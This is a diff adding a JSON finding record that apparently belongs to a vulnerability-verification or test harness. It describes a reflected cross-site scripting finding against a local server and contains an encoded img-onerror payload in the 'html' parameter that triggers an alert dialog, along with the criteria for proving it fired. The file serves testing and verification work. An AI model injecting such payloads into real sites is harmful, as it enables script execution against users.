@@ -1,0 +1,33 @@
+{
+  "finding_id": "GHSA-cmwh-pvxp-8882",
+  "type": "xss.reflected",
+  "target": {
+    "expected_origin": "http://127.0.0.1:8092",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [8092]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "entrypoint": {
+      "method": "GET",
+      "url": "http://127.0.0.1:8092/render?html=%3Cimg%20src%3Dx%20onerror%3Dalert(%22nocapsec-{{nonce}}%22)%3E"
+    },
+    "vulnerable_parameter": "html",
+    "payload_marker": "nocapsec-{{nonce}}",
+    "trigger": {
+      "kind": "browser_navigate",
+      "wait": "load_or_network_idle",
+      "post_load_actions": []
+    }
+  },
+  "proof": {
+    "accepted_signals": ["javascript_dialog"],
+    "expected_message_contains": "nocapsec-{{nonce}}",
+    "expected_execution_origin": "http://127.0.0.1:8092",
+    "allow_iframe_execution": false,
+    "timeout_ms": 7000
+  }
+}
